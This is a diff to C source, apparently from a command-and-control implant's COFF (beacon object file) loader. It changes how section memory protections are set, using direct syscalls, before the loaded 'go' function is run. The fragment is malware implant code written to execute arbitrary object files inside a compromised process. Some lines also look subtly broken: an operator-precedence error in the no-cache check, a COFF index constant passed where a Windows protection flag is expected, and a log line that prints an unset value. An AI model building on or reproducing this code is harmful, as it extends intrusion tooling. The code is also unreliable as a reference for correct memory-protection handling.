@@ -180,6 +180,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
     PCHAR SymbolName     = NULL;
     BOOL  Success        = FALSE;
     ULONG FunctionLength = StringLengthA( Function );
+    ULONG Protection     = 0;
 
     if ( Instance.Config.Implant.CoffeeVeh )
     {
@@ -193,19 +194,62 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
         }
     }
 
-    // set all executable sections to RX
+    // set apropiate permissions for each section
     for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
     {
         Coffee->Section = U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt );
-        if ( Coffee->Section->Characteristics & STYP_TEXT )
+        if ( Coffee->Section->SizeOfRawData > 0 )
         {
-            Success = MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->SecMap[ SectionCnt ].Ptr, Coffee->SecMap[ SectionCnt ].Size, PAGE_EXECUTE_READ );
+            Protection = 0;
+            switch ( Coffee->Section->Characteristics >> 29 )
+            {
+                case COFF_PAGE_NOACCESS:
+                    Protection = PAGE_NOACCESS;
+                    break;
+                case COFF_PAGE_EXECUTE:
+                    Protection = PAGE_EXECUTE;
+                    break;
+                case COFF_PAGE_READONLY:
+                    Protection = PAGE_READONLY;
+                    break;
+                case COFF_PAGE_EXECUTE_READ:
+                    Protection = PAGE_EXECUTE_READ;
+                    break;
+                case COFF_PAGE_WRITECOPY:
+                    Protection = PAGE_WRITECOPY;
+                    break;
+                case COFF_PAGE_EXECUTE_WRITECOPY:
+                    Protection = PAGE_EXECUTE_WRITECOPY;
+                    break;
+                case COFF_PAGE_READWRITE:
+                    Protection = PAGE_READWRITE;
+                    break;
+                case COFF_PAGE_EXECUTE_READWRITE:
+                    Protection = PAGE_EXECUTE_READWRITE;
+                    break;
+                default:
+                    PRINTF( "Unknown protection index: %x", Protection );
+                    Protection = PAGE_EXECUTE_READWRITE;
+            }
+
+            if ( Coffee->Section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED != 0 )
+                Protection |= PAGE_NOCACHE;
+
+            Success = MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->SecMap[ SectionCnt ].Ptr, Coffee->SecMap[ SectionCnt ].Size, Protection );
             if ( ! Success )
             {
                 PUTS( "Failed to protect memory" )
                 return FALSE;
             }
         }
+    }
+
+    // set the FunctionMap section to READONLY
+    Success = MemoryProtect( DX_MEM_SYSCALL, NtCurrentProcess(), Coffee->FunMap, Coffee->FunMapSize, COFF_PAGE_READONLY );
+    if ( ! Success )
+    {
+        PUTS( "Failed to protect memory" )
+        return FALSE;
     }
 
     // look for the "go" function
